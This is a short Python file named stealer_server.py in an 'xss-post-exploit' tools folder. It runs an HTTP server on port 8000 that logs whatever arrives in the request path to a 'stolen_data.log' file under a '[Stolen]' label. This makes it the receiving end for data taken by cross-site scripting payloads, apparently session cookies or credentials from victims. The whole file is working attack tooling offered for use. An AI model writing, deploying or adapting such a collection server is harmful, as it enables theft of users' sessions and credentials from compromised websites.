# tools/xss-post-exploit/stealer_server.py

from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

LOG_FILE = "stolen_data.log"

class StealerHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        data = urllib.parse.unquote(self.path[1:])  # Ambil data dari URL
        print(f"[Stolen] {data}")
        
        with open(LOG_FILE, "a") as f:
            f.write(data + "\n")

        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

    def log_message(self, format, *args):
        return  # Supress default logging

if __name__ == "__main__":
    print("[*] Stealer Server aktif di http://localhost:8000")
    server = HTTPServer(("0.0.0.0", 8000), StealerHandler)
    server.serve_forever()
